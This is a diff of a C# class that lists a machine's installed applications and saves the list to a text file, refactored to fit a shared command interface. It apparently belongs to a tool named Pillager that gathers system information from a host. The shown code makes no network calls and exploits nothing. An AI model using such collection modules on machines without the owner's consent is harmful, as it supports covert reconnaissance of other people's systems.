@@ -1,17 +1,13 @@
 ﻿using Microsoft.Win32;
-using System;
-using System.Collections.Generic;
+using Pillager.Helper;
 using System.IO;
-using System.Linq;
 using System.Text;
 
 namespace Pillager.SystemInfos
 {
-    internal class InstalledApp
+    internal class InstalledApp : ICommandOnce
     {
-        public static string SystemInfoName = "InstalledApp";
-
-        public static string GetInfo()
+        public string GetInfo()
         {
             StringBuilder sb = new StringBuilder();
             try
@@ -28,16 +24,16 @@ namespace Pillager.SystemInfos
             { }
             return sb.ToString();
         }
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
-                string savepath = Path.Combine(path, SystemInfoName);
+                string savepath = Path.Combine(path, "System");
                 string result = GetInfo();
                 if (!string.IsNullOrEmpty(result))
                 {
                     Directory.CreateDirectory(savepath);
-                    File.WriteAllText(Path.Combine(savepath, SystemInfoName + ".txt"), result);
+                    File.WriteAllText(Path.Combine(savepath, "InstalledApp.txt"), result, Encoding.UTF8);
                 }
             }
             catch { }
